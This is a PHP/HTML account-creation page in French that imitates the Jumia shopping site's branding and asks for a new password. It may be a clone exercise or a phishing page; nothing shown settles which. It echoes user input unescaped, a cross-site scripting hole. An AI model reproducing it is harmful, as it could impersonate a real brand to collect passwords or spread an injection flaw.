<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jumia Anniversaire 2023 | Meilleures offres de Téléphones, TVs, Mode, Maison, Beauté et plus</title>
    <link rel="icon" type="image/ico" sizes="any" href="https://www.jumia.ma/assets_he/favicon.87f00114.ico">
    <link rel="stylesheet" href="../../css/conn.css">
</head>
<body>
   <?php 
   if (!isset($_POST['num_email']) ) {
      header('Location: login.php');
   }
   ?>
   <div class="full_contain">
      <div class="spqcin_j"></div>
      <div class="header">
         <img class="logo" src="../../images/logojum" width="69" height="67">
      </div>
      <div class="card">
         <form method="post" action="sign_up_1.php" onsubmit="return verification()">
            <div class="form_mot_pass">
                    <div class="bienv">
                        <h2 >Créez votre compte</h2>
                        <p>
                            Commençons par créer votre compte.<br>
                            Pour assurer la sécurité de votre compte, nous avons besoin d'un mot de passe fort!
                        </p>
                    </div>

                    <div class="email_tel_aff">
                        <div class="aff_em_tl">
                            <?php echo $_POST['num_email']; ?>
                        </div>
                        <div class="modif">
                            <a href="login.php" onclick="submitForm();">Modifier</a>
                        </div>
                    </div>

                    <div class="ps">
                        <input class="pasw" type="password" name="password" placeholder="Mot de passe">
                    </div>

                    <div class="confps">
                        <input class="pasw" type="password" name="confirmation_password" placeholder="Confirmer le mot de passe">
                    </div>

                    <div class="subm_ps_er" id="submit-button">
                        <p id="red_er">Les mots de passe ne correspondent pas.</p>
                        <input type="hidden" name="num_email" value="<?php echo $_POST['num_email']; ?>">
                        <input type="submit" value="Continuer">
                    </div>
               </div>
         </form>
      </div>
      <div class="bla_txt">
         <div id="ret" class="text">
            Si besoin d'aide, merci de vous référer au Centre d'Assistance ou de contacter notre service client.
         </div>
      </div>

      <div class="logo444">
         <img src="../../images/jumi" width="90" height="17">
      </div>
   </div>
   
    <script>
        function verification() {
            document.getElementById('red_er').style.visibility = 'hidden';
            const password = document.querySelector('input[name="password"]');
            const confirmation_password = document.querySelector('input[name="confirmation_password"]');
            let errorMessage = "";
            
            if (password.value !== confirmation_password.value) {
                errorMessage ="Les mots de passe ne correspondent pas.";
                
            }
            if(password.value.trim() === "" || confirmation_password.value.trim() === ""){
                errorMessage ="Les champs de mot de passe ne peuvent pas être vides.";
                
            }
            if (password.value.length < 8) {
                errorMessage ="Le mot de passe doit contenir au moins 8 caractères.";
            }

            if(errorMessage!==""){
                document.getElementById('red_er').style.visibility = 'visible';
                document.getElementById('red_er').textContent=errorMessage;
                return false;
            }
            return true;
        }
    </script>

    
</body>
</html>
